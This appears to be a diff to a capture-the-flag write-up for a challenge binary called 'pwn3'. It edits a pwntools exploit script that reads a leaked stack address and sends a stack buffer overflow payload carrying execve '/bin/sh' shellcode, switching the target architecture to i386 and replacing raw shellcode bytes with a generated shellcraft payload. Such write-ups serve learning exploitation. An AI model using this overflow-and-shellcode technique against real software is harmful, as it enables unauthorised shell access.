@@ -1184,7 +1184,7 @@ pwndbg> hex(0xffffd5cc-0xffffd49e)
 
 from pwn import *
 
-context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
+context(os='linux', arch='i386', log_level='debug', terminal='kitty')
 
 target = process('./pwn3')
 
@@ -1197,7 +1197,7 @@ recvuntil(b'journey ')
 
 leak_addr = p32(int(recvuntil(b'!').strip(b'!\n'), 16))
 
-shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+shellcode = asm(shellcraft.sh())
 payload = shellcode + b'A' * (0x12e - len(shellcode)) + leak_addr
 
 sendline(payload)
